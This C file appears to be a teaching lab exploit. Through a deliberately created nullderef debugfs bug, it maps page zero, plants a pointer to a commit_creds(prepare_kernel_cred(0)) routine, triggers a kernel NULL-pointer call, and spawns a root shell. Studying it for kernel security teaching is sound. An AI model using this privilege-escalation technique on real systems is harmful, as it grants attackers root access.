#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
//we first define the structs that we need to use
//these will be relatively invisible to us, but they are the return values of some of the function we call, especially struct cred
struct cred;
struct task_struct;
//here is a definition of some functions we are going to be using later
//this is so that they are predefined for when we add them in later
typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
      __attribute__((regparm(3)));
      typedef int (*commit_creds_t)(struct cred *new)
      __attribute__((regparm(3)));

      prepare_kernel_cred_t prepare_kernel_cred;
      commit_creds_t commit_creds;

      /* Find a kernel symbol in /proc/kallsyms */
      //we open up the proc file that has every exported symbol in it
      //we then search through it until we find the symbol with the name we specifically want, and then we return the address of the function
      void *get_ksym(char *name) {
              FILE *f = fopen("/proc/kallsyms", "rb");
                  char c, sym[512];
                      void *addr;
                          int ret;
                                //here, we're reading into the buffer, comparing to see if it's what we want
                                //if it is, then we return this address   
                              while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
                                          if (!strcmp(sym, name))
                                                          return addr;
                                  return NULL;
      }

/* This function will be executed in kernel mode. */
void get_root(void) {
    //this is the core of the exploit
    //prepare_kernel_cred(0), without a daemon argument preapares a cred struct with all permissions
    //it then returns this value 
    //
    //where we use it in commit_creds
    //this function takes whatever creds we give it, and applies them to the currently running process
    //in this exploit, it is this specific process that will gain root privileges
            commit_creds(prepare_kernel_cred(0));
}

int main() {
    //here, we are using the function defined above to get the address of these symbols
    //we then assign them to the empty definitions we made earlier to complete them, and allow us to call them
    //
    //that is, if we would be able to get root access
      prepare_kernel_cred = get_ksym("prepare_kernel_cred");
        commit_creds        = get_ksym("commit_creds");
        //here, we check whether or not these symbols even exist
        //thisis not a problem on our VM 
          if (!(prepare_kernel_cred && commit_creds)) {
                    fprintf(stderr, "Kernel symbols not found. "
                                                  "Is your kernel older than 2.6.29?\n");
                      }

            /* Put a pointer to our function at NULL */
          //we map NULL to a page in virtual memory
          //this is very important that we remove the restriction on the min address or we will get an error here
          //the protections mean thatwe are allowed to read and write  to it
            mmap(0, 4096, PROT_READ|PROT_WRITE,
                           MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
            //this section right here is extremely important
            //we put a pointer in the NULL address, which is at 0, right where we jsut allocated
            //this is a pointer to a function pointer
            //the function takes no arguments and returns nothing
            //so here, we can place the address of the function we wish to call here
              void (**fn)(void) = NULL;
              //which we define here
              //we tell it that at NULL, we want to store a pointer to the function defined above
                *fn = get_root;

                  /* Trigger the kernel */
                //this section exploits the bug we created and tricks the kernel into running code at address 0
                //which is right where we put the pointer to our function
                  int fd = open("/sys/kernel/debug/nullderef/null_call", O_WRONLY);
                    write(fd, "1", 1);
                      close(fd);
//at this point, we have ran our function if everything went alright, and we should have root access for this program
//we now change it into a shell, which is dash on this machine
//this shell retains the privileges of the previous program, which is root
                        if (getuid() == 0) {
                                  char *argv[] = {"/bin/sh", NULL};
                                        execve("/bin/sh", argv, NULL);
                                          }
//if we do not get root, we end up here
//and it will throw an error to the user before returning
//ideally we should never end up here ever
                          fprintf(stderr, "Something went wrong?\n");
                            return 1;
}
